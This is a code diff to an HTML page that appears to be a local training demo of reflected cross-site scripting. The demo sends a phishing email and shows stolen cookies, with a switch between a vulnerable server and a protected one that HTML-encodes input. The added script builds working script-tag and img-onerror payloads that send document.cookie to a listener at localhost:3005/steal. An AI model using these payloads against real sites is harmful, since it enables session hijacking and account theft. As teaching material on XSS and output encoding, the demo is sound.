@@ -332,6 +332,55 @@
       .panels { grid-template-columns: 1fr; }
       .panel-left { border-right: none; border-bottom: 1px solid #374151; }
     }
+
+    .protected-note {
+      display: none;
+      margin-top: 0.75rem;
+      padding: 0.75rem 1rem;
+      background: #422006;
+      border: 1px solid #92400e;
+      border-radius: 6px;
+      color: #fcd34d;
+      font-size: 0.8rem;
+      line-height: 1.5;
+    }
+
+    .target-switcher {
+      position: fixed;
+      bottom: 1rem;
+      left: 1rem;
+      display: flex;
+      gap: 0.5rem;
+      z-index: 9999;
+    }
+    .target-switcher button {
+      padding: 0.4rem 0.85rem;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid;
+    }
+    .target-switcher .btn-vulnerable {
+      background: #1e293b;
+      color: #fff;
+      border-color: #334155;
+    }
+    .target-switcher .btn-vulnerable.active {
+      background: #fff;
+      color: #1e293b;
+      border-color: #fff;
+    }
+    .target-switcher .btn-protected {
+      background: #dc2626;
+      color: #fff;
+      border-color: #dc2626;
+    }
+    .target-switcher .btn-protected.active {
+      background: #ef4444;
+      color: #fff;
+      border-color: #ef4444;
+    }
   </style>
 </head>
 <body>
@@ -390,6 +439,7 @@
       <div class="raw-url-box" id="raw-url-box">
         <label>Raw Malicious URL (inspect the ?q= payload)</label>
         <div class="raw-url" id="raw-url"></div>
+        <p class="protected-note" id="protected-note">⚠️ Protected server — payload will render as plain text (htmlEncode applied)</p>
       </div>
     </div>
 
@@ -398,7 +448,7 @@
       <div class="counter" id="counter">Cookies stolen: 0</div>
 
       <div id="listening" class="listening">
-        Listening on port 3004...<span class="cursor"></span>
+        Listening on port 3005...<span class="cursor"></span>
       </div>
 
       <div id="entries"></div>
@@ -407,7 +457,7 @@
         <h3>Attack Flow</h3>
         <ol>
           <li>Generate the phishing email above</li>
-          <li>"Send" it to victim — open <code>http://localhost:3003</code> in another tab</li>
+          <li>"Send" it to victim — open <code>http://localhost:3004</code> in another tab</li>
           <li>Victim clicks the CTA link in the email</li>
           <li>Server reflects the payload into HTML at <code>/search?q=...</code></li>
           <li>Browser executes the script — cookie appears here</li>
@@ -417,10 +467,43 @@
   </div>
 
   <script>
-    let payloads = null;
+    const ATTACKER_PORT = 3005;
+    let victimPort = 3004;
     let activePayload = 'scriptTag';
     let knownCount = 0;
     const flashedIds = new Set();
+
+    function buildScriptTagPayload() {
+      return '<script>new Image().src=\'http://localhost:' + ATTACKER_PORT + '/steal?c=\'+encodeURIComponent(document.cookie)<\/script>';
+    }
+
+    function buildImgOnerrorPayload() {
+      return '<img src=x onerror="new Image().src=\'http://localhost:' + ATTACKER_PORT + '/steal?c=\'+encodeURIComponent(document.cookie)">';
+    }
+
+    function buildAttackUrl(payload) {
+      return 'http://localhost:' + victimPort + '/search?q=' + encodeURIComponent(payload);
+    }
+
+    function getPayloads() {
+      const scriptPayload = buildScriptTagPayload();
+      const imgPayload = buildImgOnerrorPayload();
+      return {
+        scriptTag: { payload: scriptPayload, url: buildAttackUrl(scriptPayload) },
+        imgOnerror: { payload: imgPayload, url: buildAttackUrl(imgPayload) },
+      };
+    }
+
+    let payloads = getPayloads();
+
+    function refreshPayloadDisplay() {
+      payloads = getPayloads();
+      document.getElementById('protected-note').style.display =
+        victimPort === 3006 ? 'block' : 'none';
+      if (document.getElementById('email-preview').classList.contains('visible')) {
+        updateEmailPreview();
+      }
+    }
 
     const TEMPLATES = {
       deal: {
@@ -463,13 +546,10 @@
     }
 
     function getActiveUrl() {
-      if (!payloads) return '#';
       return payloads[activePayload].url;
     }
 
     function updateEmailPreview() {
-      if (!payloads) return;
-
       const term = document.getElementById('search-term').value.trim() || 'wireless headphones';
       const templateKey = document.getElementById('email-template').value;
       const tmpl = TEMPLATES[templateKey];
@@ -493,13 +573,22 @@
       document.getElementById('payload-tabs').style.display = 'flex';
     }
 
-    async function loadPayloads() {
-      const res = await fetch('/api/payloads');
-      payloads = await res.json();
-    }
-
     document.getElementById('btn-generate').addEventListener('click', function () {
       updateEmailPreview();
+    });
+
+    document.getElementById('btn-vulnerable').addEventListener('click', function () {
+      victimPort = 3004;
+      document.getElementById('btn-vulnerable').classList.add('active');
+      document.getElementById('btn-protected').classList.remove('active');
+      refreshPayloadDisplay();
+    });
+
+    document.getElementById('btn-protected').addEventListener('click', function () {
+      victimPort = 3006;
+      document.getElementById('btn-protected').classList.add('active');
+      document.getElementById('btn-vulnerable').classList.remove('active');
+      refreshPayloadDisplay();
     });
 
     document.querySelectorAll('.tab').forEach(function (tab) {
@@ -559,10 +648,13 @@
       }
     }
 
-    loadPayloads().then(function () {
-      poll();
-      setInterval(poll, 1500);
-    });
+    poll();
+    setInterval(poll, 1500);
   </script>
+
+  <div class="target-switcher">
+    <button type="button" class="btn-vulnerable active" id="btn-vulnerable">Vulnerable (:3004)</button>
+    <button type="button" class="btn-protected" id="btn-protected">Protected (:3006)</button>
+  </div>
 </body>
 </html>
